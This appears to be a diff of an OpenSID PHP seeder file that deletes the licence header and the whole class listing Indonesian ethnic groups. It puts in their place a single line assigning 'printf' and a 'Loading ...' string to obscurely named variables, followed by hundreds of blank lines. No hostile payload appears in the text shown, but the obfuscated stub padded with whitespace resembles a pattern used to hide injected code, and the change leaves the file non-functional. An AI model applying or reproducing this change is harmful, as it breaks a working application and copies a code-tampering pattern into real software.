@@ -1,876 +1,609 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/models/seeders/dataAwal/PendudukSuku.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class PendudukSuku extends CI_Model
-{
-    public function getData()
-    {
-        return [
-            [
 
-                'id'        => 1,
-                'suku'      => 'Aceh',
-                'deskripsi' => 'Aceh',
-            ],
-            [
 
-                'id'        => 2,
-                'suku'      => 'Alas',
-                'deskripsi' => 'Aceh',
-            ],
-            [
 
-                'id'        => 3,
-                'suku'      => 'Alor',
-                'deskripsi' => 'NTT',
-            ],
-            [
 
-                'id'        => 4,
-                'suku'      => 'Ambon',
-                'deskripsi' => 'Ambon',
-            ],
-            [
 
-                'id'        => 5,
-                'suku'      => 'Ampana',
-                'deskripsi' => 'Sulawesi Tengah',
-            ],
-            [
 
-                'id'        => 6,
-                'suku'      => 'Anak Dalam',
-                'deskripsi' => 'Jambi',
-            ],
-            [
 
-                'id'        => 7,
-                'suku'      => 'Aneuk Jamee',
-                'deskripsi' => 'Aceh',
-            ],
-            [
-                'id'        => 8,
-                'suku'      => 'Arab: Orang Hadhrami',
-                'deskripsi' => 'Arab: Orang Hadhrami',
-            ],
-            [
 
-                'id'        => 9,
-                'suku'      => 'Aru',
-                'deskripsi' => 'Maluku',
-            ],
-            [
 
-                'id'        => 10,
-                'suku'      => 'Asmat',
-                'deskripsi' => 'Papua',
-            ],
-            [
-                'id'        => 11,
-                'suku'      => 'Bare’e',
-                'deskripsi' => 'Bare’e di Kabupaten Tojo Una-Una Tojo dan Tojo Barat',
-            ],
-            [
-                'id'        => 12,
-                'suku'      => 'Banten',
-                'deskripsi' => 'Banten di Banten',
-            ],
-            [
-                'id'        => 13,
-                'suku'      => 'Besemah',
-                'deskripsi' => 'Besemah di Sumatera Selatan',
-            ],
-            [
-                'id'        => 14,
-                'suku'      => 'Bali',
-                'deskripsi' => "Bali\u{a0}di Bali terdiri dari: Suku Bali Majapahit di sebagian besar Pulau Bali; Suku Bali Aga di Karangasem dan Kintamani",
-            ],
-            [
-                'id'        => 15,
-                'suku'      => 'Balantak',
-                'deskripsi' => 'Balantak di Sulawesi Tengah',
-            ],
-            [
-                'id'        => 16,
-                'suku'      => 'Banggai',
-                'deskripsi' => 'Banggai di Sulawesi Tengah (Kabupaten Banggai Kepulauan)',
-            ],
-            [
 
-                'id'        => 17,
-                'suku'      => 'Baduy',
-                'deskripsi' => "Baduy\u{a0}di Banten",
-            ],
-            [
-                'id'        => 18,
-                'suku'      => 'Bajau',
-                'deskripsi' => 'Bajau di Kalimantan Timur',
-            ],
-            [
-                'id'        => 19,
-                'suku'      => 'Banjar',
-                'deskripsi' => 'Banjar di Kalimantan Selatan',
-            ],
-            [
-                'id'        => 20,
-                'suku'      => 'Batak',
-                'deskripsi' => 'Sumatera Utara',
-            ],
-            [
-                'id'        => 21,
-                'suku'      => 'Batak Karo',
-                'deskripsi' => 'Sumatera Utara',
-            ],
-            [
-                'id'        => 22,
-                'suku'      => 'Mandailing',
-                'deskripsi' => 'Sumatera Utara',
-            ],
-            [
 
-                'id'        => 23,
-                'suku'      => 'Angkola',
-                'deskripsi' => 'Sumatera Utara',
-            ],
-            [
 
-                'id'        => 24,
-                'suku'      => 'Toba',
-                'deskripsi' => 'Sumatera Utara',
-            ],
-            [
 
-                'id'        => 25,
-                'suku'      => 'Pakpak',
-                'deskripsi' => 'Sumatera Utara',
-            ],
-            [
-                'id'        => 26,
-                'suku'      => 'Simalungun',
-                'deskripsi' => 'Sumatera Utara',
-            ],
-            [
 
-                'id'        => 27,
-                'suku'      => 'Batin',
-                'deskripsi' => 'Batin di Jambi',
-            ],
-            [
-                'id'        => 28,
-                'suku'      => 'Bawean',
-                'deskripsi' => 'Bawean di Jawa Timur (Gresik)',
-            ],
-            [
-                'id'        => 29,
-                'suku'      => 'Bentong',
-                'deskripsi' => 'Bentong di Sulawesi Selatan',
-            ],
-            [
-                'id'        => 30,
-                'suku'      => 'Berau',
-                'deskripsi' => 'Berau di Kalimantan Timur (kabupaten Berau)',
-            ],
-            [
-                'id'        => 31,
-                'suku'      => 'Betawi',
-                'deskripsi' => 'Betawi di Jakarta',
-            ],
-            [
-                'id'        => 32,
-                'suku'      => 'Bima',
-                'deskripsi' => 'Bima NTB (kota Bima)',
-            ],
-            [
-                'id'        => 33,
-                'suku'      => 'Boti',
-                'deskripsi' => 'Boti di kabupaten Timor Tengah Selatan',
-            ],
-            [
-                'id'        => 34,
-                'suku'      => 'Bolang Mongondow',
-                'deskripsi' => 'Bolang Mongondow di Sulawesi Utara (Kabupaten Bolaang Mongondow)',
-            ],
-            [
-                'id'        => 35,
-                'suku'      => 'Bugis',
-                'deskripsi' => "Bugis\u{a0}di Sulawesi Selatan: Orang Bugis Pagatan di Kalimantan Selatan, Kusan Hilir, Tanah Bumbu",
-            ],
-            [
-                'id'        => 36,
-                'suku'      => 'Bungku',
-                'deskripsi' => 'Bungku di Sulawesi Tengah (Kabupaten Morowali)',
-            ],
-            [
-                'id'        => 37,
-                'suku'      => 'Buru',
-                'deskripsi' => 'Buru di Maluku (Kabupaten Buru)',
-            ],
-            [
-                'id'        => 38,
-                'suku'      => 'Buol',
-                'deskripsi' => 'Buol di Sulawesi Tengah (Kabupaten Buol)',
-            ],
-            [
-                'id'        => 39,
-                'suku'      => 'Bulungan ',
-                'deskripsi' => 'Bulungan di Kalimantan Timur (Kabupaten Bulungan)',
-            ],
-            [
-                'id'        => 40,
-                'suku'      => 'Buton',
-                'deskripsi' => 'Buton di Sulawesi Tenggara (Kabupaten Buton dan Kota Bau-Bau)',
-            ],
-            [
-                'id'        => 41,
-                'suku'      => 'Bonai',
-                'deskripsi' => 'Bonai di Riau (Kabupaten Rokan Hilir)',
-            ],
-            [
-                'id'        => 42,
-                'suku'      => 'Cham ',
-                'deskripsi' => 'Cham di Aceh',
-            ],
-            [
-                'id'        => 43,
-                'suku'      => 'Cirebon ',
-                'deskripsi' => 'Cirebon di Jawa Barat (Kota Cirebon)',
-            ],
-            [
-                'id'        => 44,
-                'suku'      => 'Damal',
-                'deskripsi' => 'Damal di Mimika',
-            ],
-            [
-                'id'        => 45,
-                'suku'      => 'Dampeles',
-                'deskripsi' => 'Dampeles di Sulawesi Tengah',
-            ],
-            [
-                'id'        => 46,
-                'suku'      => 'Dani ',
-                'deskripsi' => 'Dani di Papua (Lembah Baliem)',
-            ],
-            [
-                'id'        => 47,
-                'suku'      => 'Dairi',
-                'deskripsi' => 'Dairi di Sumatera Utara',
-            ],
-            [
-                'id'        => 48,
-                'suku'      => 'Daya ',
-                'deskripsi' => 'Daya di Sumatera Selatan',
-            ],
-            [
-                'id'        => 49,
-                'suku'      => 'Dayak',
-                'deskripsi' => "Dayak\u{a0}terdiri dari: Suku Dayak Ahe di Kalimantan Barat; Suku Dayak Bajare di Kalimantan Barat; Suku Dayak Damea di Kalimantan Barat; Suku Dayak Banyadu di Kalimantan Barat; Suku Bakati di Kalimantan Barat; Suku Punan di Kalimantan Tengah; Suku Kanayatn di Kalimantan Barat; Suku Dayak Krio di Kalimantan Barat (Ketapang], Suku Dayak Sungai Laur di Kalimantan Barat (Ketapang], Suku Dayak Simpangh di Kalimantan Barat (Ketapang], Suku Iban di Kalimantan Barat; Suku Mualang di Kalimantan Barat (Sekada",
-            ],
-            [
-                'id'        => 50,
-                'suku'      => 'Dompu',
-                'deskripsi' => 'Dompu NTB (Kabupaten Dompu)',
-            ],
-            [
-                'id'        => 51,
-                'suku'      => 'Donggo',
-                'deskripsi' => 'Donggo, Bima',
-            ],
-            [
-                'id'        => 52,
-                'suku'      => 'Dongga',
-                'deskripsi' => 'Donggala di Sulawesi Tengah',
-            ],
-            [
-                'id'        => 53,
-                'suku'      => 'Dondo ',
-                'deskripsi' => 'Dondo di Sulawesi Tengah (Kabupaten Toli-Toli)',
-            ],
-            [
-                'id'        => 54,
-                'suku'      => 'Duri',
-                'deskripsi' => 'Duri Terletak di bagian utara Kabupaten Enrekang berbatasan dengan Kabupaten Tana Toraja, meliputi tiga kecamatan induk Anggeraja, Baraka, dan Alla di Sulawesi Selatan',
-            ],
-            [
-                'id'        => 55,
-                'suku'      => 'Eropa ',
-                'deskripsi' => 'Eropa (orang Indo, peranakan Eropa-Indonesia, atau etnik Mestizo)',
-            ],
-            [
-                'id'        => 56,
-                'suku'      => 'Flores',
-                'deskripsi' => 'Flores di NTT (Flores Timur)',
-            ],
-            [
-                'id'        => 57,
-                'suku'      => 'Lamaholot',
-                'deskripsi' => 'Lamaholot, Flores Timur, terdiri dari: Suku Wandan, di Solor Timur, Flores Timur; Suku Kaliha, di Solor Timur, Flores Timur; Suku Serang Gorang, di Solor Timur, Flores Timur; Suku Lamarobak, di Solor Timur, Flores Timur; Suku Atanuhan, di Solor Timur, Flores Timur; Suku Wotan, di Solor Timur, Flores Timur; Suku Kapitan Belen, di Solor Timur, Flores Timur',
-            ],
-            [
-                'id'        => 58,
-                'suku'      => 'Gayo',
-                'deskripsi' => 'Gayo di Aceh (Gayo Lues Aceh Tengah Bener Meriah Aceh Tenggara Aceh Timur Aceh Tamiang)',
-            ],
-            [
-                'id'        => 59,
-                'suku'      => 'Gorontalo',
-                'deskripsi' => 'Gorontalo di Gorontalo (Kota Gorontalo)',
-            ],
-            [
-                'id'        => 60,
-                'suku'      => 'Gumai ',
-                'deskripsi' => 'Gumai di Sumatera Selatan (Lahat)',
-            ],
-            [
-                'id'        => 61,
-                'suku'      => 'India',
-                'deskripsi' => 'India, terdiri dari: Suku Tamil di Aceh, Sumatera Utara, Sumatera Barat, dan DKI Jakarta; Suku Punjab di Sumatera Utara, DKI Jakarta, dan Jawa Timur; Suku Bengali di DKI Jakarta; Suku Gujarati di DKI Jakarta dan Jawa Tengah; Orang Sindhi di DKI Jakarta dan Jawa Timur; Orang Sikh di Sumatera Utara, DKI Jakarta, dan Jawa Timur',
-            ],
-            [
-                'id'        => 62,
-                'suku'      => 'Jawa',
-                'deskripsi' => 'Jawa di Jawa Tengah, Jawa Timur, DI Yogyakarta',
-            ],
-            [
-                'id'        => 63,
-                'suku'      => 'Tengger',
-                'deskripsi' => "Tengger\u{a0}di Jawa Timur (Probolinggo, Pasuruan, dan Malang)",
-            ],
-            [
-                'id'        => 64,
-                'suku'      => 'Osing ',
-                'deskripsi' => 'Osing di Jawa Timur (Banyuwangi)',
-            ],
-            [
-                'id'        => 65,
-                'suku'      => 'Samin ',
-                'deskripsi' => 'Samin di Jawa Tengah (Purwodadi)',
-            ],
-            [
-                'id'        => 66,
-                'suku'      => 'Bawean',
-                'deskripsi' => 'Bawean di Jawa Timur (Pulau Bawean)',
-            ],
-            [
-                'id'        => 67,
-                'suku'      => 'Jambi ',
-                'deskripsi' => 'Jambi di Jambi (Kota Jambi)',
-            ],
-            [
-                'id'        => 68,
-                'suku'      => 'Jepang',
-                'deskripsi' => 'Jepang di DKI Jakarta, Jawa Timur, dan Bali',
-            ],
-            [
-                'id'        => 69,
-                'suku'      => 'Kei',
-                'deskripsi' => 'Kei di Maluku Tenggara (Kabupaten Maluku Tenggara dan Kota Tual)',
-            ],
-            [
-                'id'        => 70,
-                'suku'      => 'Kaili ',
-                'deskripsi' => 'Kaili di Sulawesi Tengah (Kota Palu)',
-            ],
-            [
-                'id'        => 71,
-                'suku'      => 'Kampar',
-                'deskripsi' => 'Kampar',
-            ],
-            [
-                'id'        => 72,
-                'suku'      => 'Kaur ',
-                'deskripsi' => 'Kaur di Bengkulu (Kabupaten Kaur)',
-            ],
-            [
-                'id'        => 73,
-                'suku'      => 'Kayu Agung',
-                'deskripsi' => 'Kayu Agung di Sumatera Selatan',
-            ],
-            [
-                'id'        => 74,
-                'suku'      => 'Kerinci',
-                'deskripsi' => 'Kerinci di Jambi (Kabupaten Kerinci)',
-            ],
-            [
-                'id'        => 75,
-                'suku'      => 'Komering ',
-                'deskripsi' => 'Komering di Sumatera Selatan (Kabupaten Ogan Komering Ilir, Baturaja)',
-            ],
-            [
-                'id'        => 76,
-                'suku'      => 'Konjo Pegunungan',
-                'deskripsi' => 'Konjo Pegunungan, Kabupaten Gowa, Sulawesi Selatan',
-            ],
-            [
-                'id'        => 77,
-                'suku'      => 'Konjo Pesisir',
-                'deskripsi' => 'Konjo Pesisir, Kabupaten Bulukumba, Sulawesi Selatan',
-            ],
-            [
-                'id'        => 78,
-                'suku'      => 'Koto',
-                'deskripsi' => 'Koto di Sumatera Barat',
-            ],
-            [
-                'id'        => 79,
-                'suku'      => 'Kubu',
-                'deskripsi' => 'Kubu di Jambi dan Sumatera Selatan',
-            ],
-            [
-                'id'        => 80,
-                'suku'      => 'Kulawi',
-                'deskripsi' => 'Kulawi di Sulawesi Tengah',
-            ],
-            [
-                'id'        => 81,
-                'suku'      => 'Kutai ',
-                'deskripsi' => 'Kutai di Kalimantan Timur (Kutai Kartanegara)',
-            ],
-            [
-                'id'        => 82,
-                'suku'      => 'Kluet ',
-                'deskripsi' => 'Kluet di Aceh (Aceh Selatan)',
-            ],
-            [
-                'id'        => 83,
-                'suku'      => 'Korea ',
-                'deskripsi' => 'Korea di DKI Jakarta',
-            ],
-            [
-                'id'        => 84,
-                'suku'      => 'Krui',
-                'deskripsi' => 'Krui di Lampung',
-            ],
-            [
-                'id'        => 85,
-                'suku'      => 'Laut,',
-                'deskripsi' => 'Laut, Kepulauan Riau',
-            ],
-            [
-                'id'        => 86,
-                'suku'      => 'Lampung',
-                'deskripsi' => 'Lampung, terdiri dari: Suku Sungkai di Lampung; Suku Abung di Lampung; Suku Way Kanan di Lampung, Sumatera Selatan dan Bengkulu; Suku Pubian di Lampung; Suku Tulang Bawang di Lampung; Suku Melinting di Lampung; Suku Peminggir Teluk di Lampung; Suku Ranau di Lampung, Sumatera Selatan dan Sumatera Utara; Suku Komering di Sumatera Selatan; Suku Cikoneng di Banten; Suku Merpas di Bengkulu; Suku Belalau di Lampung; Suku Smoung di Lampung; Suku Semaka di Lampung',
-            ],
-            [
-                'id'        => 87,
-                'suku'      => 'Lematang ',
-                'deskripsi' => 'Lematang di Sumatera Selatan',
-            ],
-            [
-                'id'        => 88,
-                'suku'      => 'Lembak',
-                'deskripsi' => 'Lembak, Kabupaten Rejang Lebong, Bengkulu',
-            ],
-            [
-                'id'        => 89,
-                'suku'      => 'Lintang',
-                'deskripsi' => 'Lintang, Sumatera Selatan',
-            ],
-            [
-                'id'        => 90,
-                'suku'      => 'Lom',
-                'deskripsi' => 'Lom, Bangka Belitung',
-            ],
-            [
-                'id'        => 91,
-                'suku'      => 'Lore',
-                'deskripsi' => 'Lore, Sulawesi Tengah',
-            ],
-            [
-                'id'        => 92,
-                'suku'      => 'Lubu',
-                'deskripsi' => 'Lubu, daerah perbatasan antara Provinsi Sumatera Utara dan Provinsi Sumatera Barat',
-            ],
-            [
-                'id'        => 93,
-                'suku'      => 'Moronene',
-                'deskripsi' => 'Moronene di Sulawesi Tenggara.',
-            ],
-            [
-                'id'        => 94,
-                'suku'      => 'Madura',
-                'deskripsi' => 'Madura di Jawa Timur (Pulau Madura, Kangean, wilayah Tapal Kuda)',
-            ],
-            [
-                'id'        => 95,
-                'suku'      => 'Makassar',
-                'deskripsi' => 'Makassar di Sulawesi Selatan: Kabupaten Gowa, Kabupaten Takalar, Kabupaten Jeneponto, Kabupaten Bantaeng, Kabupaten Bulukumba (sebagian), Kabupaten Sinjai (bagian perbatasan Kab Gowa), Kabupaten Maros (sebagian), Kabupaten Pangkep (sebagian), Kota Makassar',
-            ],
-            [
-                'id'        => 96,
-                'suku'      => 'Mamasa',
-                'deskripsi' => 'Mamasa (Toraja Barat) di Sulawesi Barat: Kabupaten Mamasa',
-            ],
-            [
-                'id'        => 97,
-                'suku'      => 'Manda',
-                'deskripsi' => 'Mandar Sulawesi Barat: Polewali Mandar',
-            ],
-            [
-                'id'        => 98,
-                'suku'      => 'Melayu',
-                'deskripsi' => 'Melayu, terdiri dari Suku Melayu Tamiang di Aceh (Aceh Tamiang], Suku Melayu Riau di Riau dan Kepulauan Riau; Suku Melayu Deli di Sumatera Utara; Suku Melayu Jambi di Jambi; Suku Melayu Bangka di Pulau Bangka; Suku Melayu Belitung di Pulau Belitung; Suku Melayu Sambas di Kalimantan Barat',
-            ],
-            [
-                'id'        => 99,
-                'suku'      => 'Mentawai',
-                'deskripsi' => 'Mentawai di Sumatera Barat (Kabupaten Kepulauan Mentawai)',
-            ],
-            [
-                'id'        => 100,
-                'suku'      => 'Minahasa',
-                'deskripsi' => 'Minahasa di Sulawesi Utara (Kabupaten Minahasa), terdiri 9 subetnik : Suku Babontehu; Suku Bantik; Suku Pasan Ratahan',
-            ],
-            [
-                'id'        => 101,
-                'suku'      => 'Ponosakan',
-                'deskripsi' => 'Ponosakan; Suku Tonsea; Suku Tontemboan; Suku Toulour; Suku Tonsawang; Suku Tombulu',
-            ],
-            [
-                'id'        => 102,
-                'suku'      => 'Minangkabau',
-                'deskripsi' => 'Minangkabau, Sumatera Barat',
-            ],
-            [
-                'id'        => 103,
-                'suku'      => 'Mongondow',
-                'deskripsi' => 'Mongondow, Sulawesi Utara',
-            ],
-            [
-                'id'        => 104,
-                'suku'      => 'Mori',
-                'deskripsi' => 'Mori, Kabupaten Morowali, Sulawesi Tengah',
-            ],
-            [
-                'id'        => 105,
-                'suku'      => 'Muko-Muko',
-                'deskripsi' => 'Muko-Muko di Bengkulu (Kabupaten Mukomuko)',
-            ],
-            [
-                'id'        => 106,
-                'suku'      => 'Muna',
-                'deskripsi' => 'Muna di Sulawesi Tenggara (Kabupaten Muna)',
-            ],
-            [
-                'id'        => 107,
-                'suku'      => 'Muyu',
-                'deskripsi' => 'Muyu di Kabupaten Boven Digoel, Papua',
-            ],
-            [
-                'id'        => 108,
-                'suku'      => 'Mekongga',
-                'deskripsi' => 'Mekongga di Sulawesi Tenggara (Kabupaten Kolaka dan Kabupaten Kolaka Utara)',
-            ],
-            [
-                'id'        => 109,
-                'suku'      => 'Moro',
-                'deskripsi' => 'Moro di Kalimantan Barat dan Kalimantan Utara',
-            ],
-            [
-                'id'        => 110,
-                'suku'      => 'Nias',
-                'deskripsi' => 'Nias di Sumatera Utara (Kabupaten Nias, Nias Selatan dan Nias Utara dari dua keturunan Jepang dan Vietnam)',
-            ],
-            [
-                'id'        => 111,
-                'suku'      => 'Ngada ',
-                'deskripsi' => 'Ngada di NTT: Kabupaten Ngada',
-            ],
-            [
-                'id'        => 112,
-                'suku'      => 'Osing',
-                'deskripsi' => 'Osing di Banyuwangi Jawa Timur',
-            ],
-            [
-                'id'        => 113,
-                'suku'      => 'Ogan',
-                'deskripsi' => 'Ogan di Sumatera Selatan',
-            ],
-            [
-                'id'        => 114,
-                'suku'      => 'Ocu',
-                'deskripsi' => 'Ocu di Kabupaten Kampar, Riau',
-            ],
-            [
-                'id'        => 115,
-                'suku'      => 'Padoe',
-                'deskripsi' => 'Padoe di Sulawesi Tengah dan Sulawesi Selatan',
-            ],
-            [
-                'id'        => 116,
-                'suku'      => 'Papua',
-                'deskripsi' => 'Papua / Irian, terdiri dari: Suku Asmat di Kabupaten Asmat; Suku Biak di Kabupaten Biak Numfor; Suku Dani, Lembah Baliem, Papua; Suku Ekagi, daerah Paniai, Abepura, Papua; Suku Amungme di Mimika; Suku Bauzi, Mamberamo hilir, Papua utara; Suku Arfak di Manokwari; Suku Kamoro di Mimika',
-            ],
-            [
-                'id'        => 117,
-                'suku'      => 'Palembang',
-                'deskripsi' => 'Palembang di Sumatera Selatan (Kota Palembang)',
-            ],
-            [
-                'id'        => 118,
-                'suku'      => 'Pamona',
-                'deskripsi' => 'Pamona di Sulawesi Tengah (Kabupaten Poso) dan di Sulawesi Selatan',
-            ],
-            [
-                'id'        => 119,
-                'suku'      => 'Pesisi',
-                'deskripsi' => 'Pesisi di Sumatera Utara (Tapanuli Tengah)',
-            ],
-            [
-                'id'        => 120,
-                'suku'      => 'Pasir',
-                'deskripsi' => 'Pasir di Kalimantan Timur (Kabupaten Pasir)',
-            ],
-            [
-                'id'        => 121,
-                'suku'      => 'Pubian',
-                'deskripsi' => 'Pubian di Lampung',
-            ],
-            [
-                'id'        => 122,
-                'suku'      => 'Pattae',
-                'deskripsi' => 'Pattae di Polewali Mandar',
-            ],
-            [
-                'id'        => 123,
-                'suku'      => 'Pakistani',
-                'deskripsi' => 'Pakistani di Sumatera Utara, DKI Jakarta, dan Jawa Tengah',
-            ],
-            [
-                'id'        => 124,
-                'suku'      => 'Peranakan',
-                'deskripsi' => 'Peranakan (Tionghoa-Peranakan atau Baba Nyonya)',
-            ],
-            [
-                'id'        => 125,
-                'suku'      => 'Rawa',
-                'deskripsi' => 'Rawa, Rokan Hilir, Riau',
-            ],
-            [
-                'id'        => 126,
-                'suku'      => 'Rejang',
-                'deskripsi' => 'Rejang di Bengkulu (Kabupaten Bengkulu Tengah, Kabupaten Bengkulu Utara, Kabupaten Kepahiang, Kabupaten Lebong, dan Kabupaten Rejang Lebong)',
-            ],
-            [
-                'id'        => 127,
-                'suku'      => 'Rote',
-                'deskripsi' => 'Rote di NTT (Kabupaten Rote Ndao)',
-            ],
-            [
-                'id'        => 128,
-                'suku'      => 'Rongga',
-                'deskripsi' => 'Rongga di NTT Kabupaten Manggarai Timur',
-            ],
-            [
-                'id'        => 129,
-                'suku'      => 'Rohingya',
-                'deskripsi' => 'Rohingya',
-            ],
-            [
-                'id'        => 130,
-                'suku'      => 'Sabu',
-                'deskripsi' => 'Sabu di Pulau Sabu, NTT',
-            ],
-            [
-                'id'        => 131,
-                'suku'      => 'Saluan',
-                'deskripsi' => 'Saluan di Sulawesi Tengah',
-            ],
-            [
-                'id'        => 132,
-                'suku'      => 'Sambas',
-                'deskripsi' => 'Sambas (Melayu Sambas) di Kalimantan Barat: Kabupaten Sambas',
-            ],
-            [
-                'id'        => 133,
-                'suku'      => 'Samin',
-                'deskripsi' => 'Samin di Jawa Tengah (Blora) dan Jawa Timur (Bojonegoro)',
-            ],
-            [
-                'id'        => 134,
-                'suku'      => 'Sangi',
-                'deskripsi' => 'Sangir di Sulawesi Utara (Kepulauan Sangihe)',
-            ],
-            [
-                'id'        => 135,
-                'suku'      => 'Sasak',
-                'deskripsi' => "Sasak\u{a0}di NTB, Lombok",
-            ],
-            [
-                'id'        => 136,
-                'suku'      => 'Sekak Bangka',
-                'deskripsi' => 'Sekak Bangka',
-            ],
-            [
-                'id'        => 137,
-                'suku'      => 'Sekayu',
-                'deskripsi' => 'Sekayu di Sumatera Selatan',
-            ],
-            [
-                'id'        => 138,
-                'suku'      => 'Semendo ',
-                'deskripsi' => 'Semendo di Bengkulu, Sumatera Selatan (Muara Enim)',
-            ],
-            [
-                'id'        => 139,
-                'suku'      => 'Serawai ',
-                'deskripsi' => 'Serawai di Bengkulu (Kabupaten Bengkulu Selatan dan Kabupaten Seluma)',
-            ],
-            [
-                'id'        => 140,
-                'suku'      => 'Simeulue',
-                'deskripsi' => 'Simeulue di Aceh (Kabupaten Simeulue)',
-            ],
-            [
-                'id'        => 141,
-                'suku'      => 'Sigulai ',
-                'deskripsi' => 'Sigulai di Aceh (Kabupaten Simeulue bagian utara',
-            ],
-            [
-                'id'        => 142,
-                'suku'      => 'Suluk',
-                'deskripsi' => 'Suluk di Kalimantan Utara)',
-            ],
-            [
-                'id'        => 143,
-                'suku'      => 'Sumbawa ',
-                'deskripsi' => 'Sumbawa Di NTB (Kabupaten Sumbawa)',
-            ],
-            [
-                'id'        => 144,
-                'suku'      => 'Sumba',
-                'deskripsi' => 'Sumba di NTT (Sumba Barat, Sumba Timur)',
-            ],
-            [
-                'id'        => 145,
-                'suku'      => 'Sunda',
-                'deskripsi' => 'Sunda di Jawa Barat, Banten, DKI Jakarta, Lampung, Sumatra Selatan dan Jawa Tengah',
-            ],
-            [
-                'id'        => 146,
-                'suku'      => 'Sungkai ',
-                'deskripsi' => 'Sungkai di Lampung Lampung Utara',
-            ],
-            [
-                'id'        => 147,
-                'suku'      => 'Talau',
-                'deskripsi' => 'Talaud di Sulawesi Utara (Kepulauan Talaud)',
-            ],
-            [
-                'id'        => 148,
-                'suku'      => 'Talang Mamak',
-                'deskripsi' => 'Talang Mamak di Riau (Indragiri Hulu)',
-            ],
-            [
-                'id'        => 149,
-                'suku'      => 'Tamiang ',
-                'deskripsi' => 'Tamiang di Aceh (Kabupaten Aceh Tamiang)',
-            ],
-            [
-                'id'        => 150,
-                'suku'      => 'Tengger ',
-                'deskripsi' => 'Tengger di Jawa Timur (Kabupaten Pasuruan) dan Probolinggo (lereng G. Bromo)',
-            ],
-            [
-                'id'        => 151,
-                'suku'      => 'Ternate ',
-                'deskripsi' => 'Ternate di Maluku Utara (Kota Ternate)',
-            ],
-            [
-                'id'        => 152,
-                'suku'      => 'Tidore',
-                'deskripsi' => 'Tidore di Maluku Utara (Kota Tidore)',
-            ],
-            [
-                'id'        => 153,
-                'suku'      => 'Tidung',
-                'deskripsi' => 'Tidung di Kalimantan Timur (Kabupaten Tanah Tidung)',
-            ],
-            [
-                'id'        => 154,
-                'suku'      => 'Timor',
-                'deskripsi' => 'Timor di NTT, Kota Kupang',
-            ],
-            [
-                'id'        => 155,
-                'suku'      => 'Tionghoa',
-                'deskripsi' => 'Tionghoa, terdiri dari: Orang Cina Parit di Pelaihari, Tanah Laut, Kalsel; Orang Cina Benteng di Tangerang, Provinsi Banten; Orang Tionghoa Hokkien di Jawa dan Sumatera Utara; Orang Tionghoa Hakka di Belitung dan Kalimantan Barat; Orang Tionghoa Hubei; Orang Tionghoa Hainan; Orang Tionghoa Kanton; Orang Tionghoa Hokchia; Orang Tionghoa Tiochiu',
-            ],
-            [
-                'id'        => 156,
-                'suku'      => 'Tojo',
-                'deskripsi' => 'Tojo di Sulawesi Tengah (Kabupaten Tojo Una-Una)',
-            ],
-            [
-                'id'        => 157,
-                'suku'      => 'Toraja',
-                'deskripsi' => 'Toraja di Sulawesi Selatan (Tana Toraja)',
-            ],
-            [
-                'id'        => 158,
-                'suku'      => 'Tolaki',
-                'deskripsi' => 'Tolaki di Sulawesi Tenggara (Kendari)',
-            ],
-            [
-                'id'        => 159,
-                'suku'      => 'Toli Toli',
-                'deskripsi' => 'Toli Toli di Sulawesi Tengah (Kabupaten Toli-Toli)',
-            ],
-            [
-                'id'        => 160,
-                'suku'      => 'Tomini',
-                'deskripsi' => 'Tomini di Sulawesi Tengah (Kabupaten Parigi Mouton',
-            ],
-            [
-                'id'        => 161,
-                'suku'      => 'Una-una ',
-                'deskripsi' => 'Una-una di Sulawesi Tengah (Kabupaten Tojo Una-Una)',
-            ],
-            [
-                'id'        => 162,
-                'suku'      => 'Ulu',
-                'deskripsi' => 'Ulu di Sumatera Utara (Mandailing natal)',
-            ],
-            [
-                'id'        => 163,
-                'suku'      => 'Wolio',
-                'deskripsi' => 'Wolio di Sulawesi Tenggara (Buton)',
-            ],
-        ];
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
